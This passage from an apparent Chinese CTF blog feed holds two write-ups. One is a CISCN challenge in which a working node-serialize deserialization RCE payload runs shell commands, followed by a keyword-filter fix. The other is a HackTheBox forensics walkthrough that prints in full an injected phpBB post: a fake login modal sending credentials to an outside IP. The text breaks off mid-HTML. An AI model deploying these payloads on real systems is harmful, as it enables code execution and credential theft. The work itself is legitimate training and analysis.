<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">		<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">				res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>接收cookie中的profile参数，将其base64编码后进行反序列化</p>
<p>这里的考点就是nodejs中的serialize模块反序列化漏洞 <a href="https://c1oudfl0w0.github.io/blog/2023/11/18/serialize%E6%A8%A1%E5%9D%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">参考文章</a></p>
<p>我们先安装此模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure>

<p>然后序列化（无回显直接写文件外带）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var y = &#123;</span><br><span class="line">	function()&#123;</span><br><span class="line">		require(&#x27;child_process&#x27;).exec(&#x27;cat /f* &gt; /tmp/1.txt&#x27;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">var s = require(&#x27;node-serialize&#x27;);</span><br><span class="line">console.log(&quot;Serialized:\n&quot; + s.serialize(y));</span><br></pre></td></tr></table></figure>

<p>得到payload</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706112821088.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&#x27;child_process&#x27;).exec(&#x27;cat /f* &gt; /tmp/1.txt&#x27;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="FIX-3"><a href="#FIX-3" class="headerlink" title="FIX"></a>FIX</h3><p>将几个关键字过滤一下就行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(str.<span class="title function_">match</span>(<span class="regexp">/(funcion|require|exec|child_process)/</span>))&#123;</span><br><span class="line">			res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">			<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            	<span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">					res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>不过听说还有xss的洞要修</p>
<p>用的是22年黑盾杯的方法：<a href="https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg">https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg</a></p>
<p>复现xss参考：<a href="https://blog.mo60.cn/index.php/archives/487.html">https://blog.mo60.cn/index.php/archives/487.html</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
        <tag>线下赛</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>Bumblebee</title>
    <url>/article/Bumblebee-HackTheBox.html</url>
    <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
<span id="more"></span>

<h1 id="Bumblebee"><a href="#Bumblebee" class="headerlink" title="Bumblebee"></a>Bumblebee</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，他们似乎窃取了管理用户的凭据！我们附上了论坛的一些日志和 sqlite3 格式的完整数据库转储，以帮助您进行调查。</p>
</blockquote>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>外部承包商的用户名是什么？</strong></p>
<p>解压文件得到log日志和sqlite3数据库文件</p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095217173.png"></p>
<p>使用sqlite打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite incident.sqlite3</span><br></pre></td></tr></table></figure>

<p>然后<code>.tables</code>查看所有表找到<code>phpbb_users</code>，那么我们查看下字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma table_info(phpbb_users);</span><br></pre></td></tr></table></figure>

<p>发现有<code>username</code>和<code>user_password</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095103867.png"></p>
<p>直接查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,user_password from phpbb_users;</span><br></pre></td></tr></table></figure>

<p>注意到最下面的<code>apoole1</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095434129.png"></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>承包商使用什么 IP 地址创建帐户？</strong></p>
<p>刚刚查看表的字段里有<code>user_ip</code>，查询得到ip为<code>10.10.0.78</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_ip from phpbb_users where username=&quot;apoole1&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>承包商发布的恶意帖子的 post_id 是什么？</strong></p>
<p>我们找到<code>phpbb_posts</code>，然后查询一下</p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419100317816.png"></p>
<p>很明显id为9的内容很多</p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>凭据窃取者将其数据发送到的完整 URI 是什么？</strong></p>
<p>我们将前一问的表单内容下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select post_text from phpbb_posts where post_id=9;</span><br></pre></td></tr></table></figure>

<p>内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; z-index: 100;&#125;.modal &#123; position:fixed; top:0; left:0; height:100%;</span><br><span class="line">        width:100%; z-index:101; background-color:white; opacity:1;&#125;.modal.hidden</span><br><span class="line">        &#123; visibility: hidden;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function sethidden() &#123;</span><br><span class="line">            const d = new Date();</span><br><span class="line">            d.setTime(d.getTime() + (24 * 60 * 60 * 1000));</span><br><span class="line">            let expires = &quot;expires=&quot; + d.toUTCString();</span><br><span class="line">            document.cookie = &quot;phpbb_token=1;&quot; + expires + &quot;;&quot;;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.add(&quot;hidden&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.addEventListener(&quot;DOMContentLoaded&quot;,</span><br><span class="line">        function(event) &#123;</span><br><span class="line">            let cookieexists = false;</span><br><span class="line">            let name = &quot;phpbb_token=&quot;;</span><br><span class="line">            let cookies = decodeURIComponent(document.cookie);</span><br><span class="line">            let ca = cookies.split(&#x27;;&#x27;);</span><br><span class="line">            for (let i = 0; i &lt; ca.length; i++) &#123;</span><br><span class="line">                let c = ca[i];</span><br><span class="line">                while (c.charAt(0) == &#x27; &#x27;) &#123;</span><br><span class="line">                    c = c.substring(1);</span><br><span class="line">                &#125;</span><br><span class="line">                if (c.indexOf(name) == 0) &#123;</span><br><span class="line">                    cookieexists = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (cookieexists) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.remove(&quot;hidden&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe name=&quot;hiddenframe&quot; id=&quot;hiddenframe&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">    &lt;/iframe&gt;</span><br><span class="line">    &lt;div class=&quot;modal hidden&quot; id=&quot;zbzbz1234&quot; onload=&quot;shouldshow&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;wrap&quot; class=&quot;wrap&quot;&gt;</span><br><span class="line">            &lt;a id=&quot;top&quot; class=&quot;top-anchor&quot; accesskey=&quot;t&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-header&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;headerbar&quot; role=&quot;banner&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div id=&quot;site-description&quot; class=&quot;site-description&quot;&gt;</span><br><span class="line">                            &lt;a id=&quot;logo&quot; class=&quot;logo&quot; href=&quot;./index.php&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;site_logo&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            &lt;h1&gt;</span><br><span class="line">                                forum.forela.co.uk</span><br><span class="line">                            &lt;/h1&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Forela internal forum</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                            &lt;p class=&quot;skiplink&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#start_here&quot;&gt;</span><br><span class="line">                                    Skip to content</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div id=&quot;search-box&quot; class=&quot;search-box search-header&quot; role=&quot;search&quot;&gt;</span><br><span class="line">                            &lt;form action=&quot;./search.php&quot; method=&quot;get&quot; id=&quot;search1&quot;&gt;</span><br><span class="line">                                &lt;fieldset&gt;</span><br><span class="line">                                    &lt;input name=&quot;keywords&quot; id=&quot;keywords1&quot; type=&quot;search&quot; maxlength=&quot;128&quot; title=&quot;Search for keywords&quot;</span><br><span class="line">                                    class=&quot;inputbox search tiny&quot; size=&quot;20&quot; value=&quot;&quot; placeholder=&quot;Search…&quot;&gt;</span><br><span class="line">                                    &lt;button class=&quot;button button-search&quot; type=&quot;submit&quot; title=&quot;Search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/button&gt;</span><br><span class="line">                                    &lt;a href=&quot;./search.php&quot; class=&quot;button button-search-end&quot; title=&quot;Advanced search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-cog fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Advanced search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/fieldset&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-main&quot; class=&quot;nav-main linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li id=&quot;quick-links&quot; class=&quot;quick-links dropdown-container responsive-menu&quot;</span><br><span class="line">                            data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#&quot; class=&quot;dropdown-trigger dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Quick links</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot; role=&quot;menu&quot;&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=unanswered&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-gray&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Unanswered topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=active_topics&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-blue&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Active topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Search</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;/phpBB3/app.php/help/faq&quot; rel=&quot;help&quot; title=&quot;Frequently Asked Questions&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-question-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        FAQ</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=login&quot; title=&quot;Login&quot; accesskey=&quot;x&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-power-off fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Login</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=register&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-pencil-square-o  fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Register</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                            &lt;/li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-breadcrumbs&quot; class=&quot;nav-breadcrumbs linklist navlinks&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/BreadcrumbList&quot;</span><br><span class="line">                            style=&quot;max-width: 936px;&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot; itemtype=&quot;http://schema.org/ListItem&quot; itemprop=&quot;itemListElement&quot;</span><br><span class="line">                                itemscope=&quot;&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; itemtype=&quot;https://schema.org/Thing&quot; itemprop=&quot;item&quot;</span><br><span class="line">                                    accesskey=&quot;h&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span itemprop=&quot;name&quot;&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                    &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside responsive-search&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./search.php&quot; title=&quot;View the advanced search options&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                        Search</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;a id=&quot;start_here&quot; class=&quot;anchor&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-body&quot; class=&quot;page-body&quot; role=&quot;main&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                            &lt;h3&gt;</span><br><span class="line">                                Session Timeout</span><br><span class="line">                            &lt;/h3&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Your session token has timed out in order to proceed you must login again.</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</span><br><span class="line">                target=&quot;hiddenframe&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                                &lt;h2 class=&quot;login-title&quot;&gt;</span><br><span class="line">                                    Login</span><br><span class="line">                                &lt;/h2&gt;</span><br><span class="line">                                &lt;fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;username&quot;&gt;</span><br><span class="line">                                                Username:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;text&quot; tabindex=&quot;1&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;25&quot;</span><br><span class="line">                                            value=&quot;&quot; class=&quot;inputbox autowidth&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;password&quot;&gt;</span><br><span class="line">                                                Password:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;password&quot; tabindex=&quot;2&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;25&quot;</span><br><span class="line">                                            class=&quot;inputbox autowidth&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;autologin&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot; id=&quot;autologin&quot; tabindex=&quot;4&quot;&gt;</span><br><span class="line">                                                Remember me</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;viewonline&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;viewonline&quot; id=&quot;viewonline&quot; tabindex=&quot;5&quot;&gt;</span><br><span class="line">                                                Hide my online status this session</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &amp;nbsp;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;submit&quot; name=&quot;login&quot; tabindex=&quot;6&quot; value=&quot;Login&quot; class=&quot;button1&quot;</span><br><span class="line">                                            onclick=&quot;sethidden()&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                &lt;/fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;page-footer&quot; class=&quot;page-footer&quot; role=&quot;contentinfo&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-footer&quot; class=&quot;nav-footer linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;responsive-menu hidden rightside dropdown-container&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;javascript:void(0);&quot; class=&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot;&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                All times are</span><br><span class="line">                                &lt;span title=&quot;UTC&quot;&gt;</span><br><span class="line">                                    UTC</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./ucp.php?mode=delete_cookies&quot; data-ajax=&quot;true&quot; data-refresh=&quot;true&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-trash fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Delete cookies</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;copyright&quot;&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;span class=&quot;footer-copyright&quot;&gt;</span><br><span class="line">                            Powered by</span><br><span class="line">                            &lt;a href=&quot;https://www.phpbb.com/&quot;&gt;</span><br><span class="line">                                phpBB</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            ® Forum Software © phpBB Limited</span><br><span class="line">                        &lt;/span&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=privacy&quot; title=&quot;Privacy&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span 